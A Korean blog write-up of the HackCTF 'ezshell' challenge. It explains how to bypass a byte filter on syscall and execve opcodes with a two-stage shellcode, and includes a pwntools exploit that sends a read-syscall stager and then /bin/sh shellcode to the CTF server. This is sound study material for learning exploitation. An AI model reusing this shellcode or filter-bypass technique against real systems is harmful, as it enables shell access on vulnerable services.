---
layout: post
title:  "HackCTF ezshell write-up"
date:   2020-03-22 19:45:55
image:  hackctf_ezshell.PNG
tags:   [HackCTF]
categories: [Write-up]
---

### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20ezshell/Untitled.png)

Full RELRO와 카나리가 걸려있다. 또한 PIE도 걸려있는데 현재 RWX가 있는걸로 봐서 쉘코드 관련한 문제로 보인다.

<br>

**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20ezshell/Untitled%201.png)

바이너리를 실행시키면 처음에 입력을 받고 어떠한 값이 출력된다. 

<br>

**3) 코드흐름 파악**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
    
void Init(void)
{
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
}

int main(void)
{
    Init();

    char result[100] = "\x0F\x05\x48\x31\xED\x48\x31\xE4\x48\x31\xC0\x48\x31\xDB\x48\x31\xC9\x48\x31\xD2\x48\x31\xF6\x48\x31\xFF\x4D\x31\xC0\x4D\x31\xC9\x4D\x31\xD2\x4D\x31\xDB\x4D\x31\xE4\x4D\x31\xED\x4D\x31\xF6\x4D\x31\xFF";
    char shellcode[30];
    char filter[4] = {'\xb0', '\x3b', '\x0f', '\x05'};

    read(0, shellcode, 30);
    

    for (int i = 0; i <= 3; i ++)
    {
        if (strchr(shellcode, filter[i]))
        {
            puts("filtering :)");
            exit(1);
        }		
    }

    for (int i = 0; i < 30; i++)
    {
        if (!shellcode[i])
        {
            puts("null :)");
            exit(1);
        }
    }

    strcat(result, shellcode);
    (*(void (*)()) result + 2)();
}
```

<br>
이번 문제는 아예 코드를 줘버렸다. 코드의 흐름은 다음과 같다.



1. result배열에 어떠한 값이 들어가 있다. 해당 값을 디스어셈블시키면 다음과 같다.

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20ezshell/Untitled%202.png)

    처음에 syscall이 보이고 그 뒤에는 모든 레지스터들을 다 xor 연산하여 0으로 초기화 시킨다

2. shellcode 배열에 입력을 받는다
3. -
4. 입력한 shellcode안에 filter 배열에 들어있는 값이 존재하는지 확인하고 존재하면 filtering: 문자열이 출력되면서 종료된다.

    여기서 필터의 개수는 총 4개로서 \x0f\x05는 syscall을 뜻하고, \3b는 59로서 execve syscall을 할때 필요한 rax값이다. /xb0은 잘모르겠다

5. 그다음 또 반복문을 돌면서 입력한 shellcode 배열에 널값이 존재하는지 확인하고 있으면 종료된다.
6. 만약 shellcode 배열이 필터에 걸리지 않고 널바이트가 없다면, result+2 즉 syscall 그다음을 호출한다.


<br><br><br>


### 2. 접근방법

---

쉘코드를 작성해야한다. 길이제한은 30바이트로 저번 Unexploitable#4 문제에서 간단한 쉘코드를 만들었기 때문에 이를 참조하여 필터에 걸리지 않는 쉘코드를 짤것이다.

내가 작성한 쉘코드는 다음과 같다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20ezshell/Untitled%203.png)

pwntools 의 asm기능을 이용하여 간단하게 구현하였다.

<br><br>

**시나리오**

1. syscall로 read함수를 호출하여 일반 인터넷에 있는 23바이트? 짜리 쉘코드를 삽입한다
2. jmp 로 쉘코드를 실행한다!

- **mov rsp, QWORD PTR fs:[rbx];**

    result 배열에 들어있는 쉘코드 때문에 rsp가 0이다. 따라서 위 코드를 진행해야 push나 pop 같은 명령어를 사용가능하다.

- **lea rsi, [rip-1];**

    현재 rip의 주소를 rsi에 복사를 한다. 단, 그냥 rip 이렇게 하면 널값이 들어가므로 -1 연산을 통해 널값을 없앤다. 즉 rsi에 실제 쉘코드가 들어갈 주소가 들어간다.

- **mov dx, 0xffff;**

    read함수의 입력 사이즈를 위해 삽입하였다.

- **jmp 0xffffffffffffffbb+5**

    현재 syscall 위치로 가야한다. 따라서 상대주소를 줘야하므로, 

    => "목적지 주소(syscall 위치) - 현 rip주소 - 5" 를 계산하여서 입력을 주면된다.

    근데 그냥 이렇게 jmp ~ 입력하면 에러가 난다. 따라서 위 사진처럼 입력해줘야한다.

    (vma는 base주소라고 생각하면 됨.)

    [jmp, call instruction 주소 계산](http://umbum.tistory.com/102)

<br>

사실 이렇게 syscall 위치의 상대주소를 구해도 실제 디버깅 해보면 틀리게 나온다. 따라서 직접 디버깅하면서 확인한 경과 위 공식?에서 +5를 해야지 실제 syscall 주소가 들어간다.


<br><br><br>


### 3. 풀이

---

최종 익스코드는 다음과 같다
```python
from pwn import *
context.arch="amd64"
context.log_level="DEBUG"
p=remote("ctf.j0n9hyun.xyz",3036)
#p=process("./ezshell")
#gdb.attach(p,'code\nb *0xb92+$code\n')

shell="mov rsp,QWORD PTR fs:[rbx];"
shell+="lea rsi,[rip-1];"
shell+="mov dx,0xffff;"
shell=asm(shell)
shell+=asm('jmp '+hex(0xFFFFFFFFFFFFFFBB+5), vma=0x1, arch='amd64',os='linux')
shell=shell.ljust(30,'\xcc')
log.info(len(shell))
log.info(shell)
p.send(shell)
shell2 = "\x90"*0x100
shell2 +="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x$
pause()
p.sendline(shell2)
p.interactive()
```

<br><br><br>


### 4. 몰랐던 개념

---

- 쉘코드 관련 문제는 처음 풀어봤다. pzshell을 통해 복습겸 다시 익혀야겠다.
- 추가적으로 위 익스코드에서 처음에 sendline으로 보내면 다음 read가 개행떄문에 씹힌다. 따라서 send로 보내야한다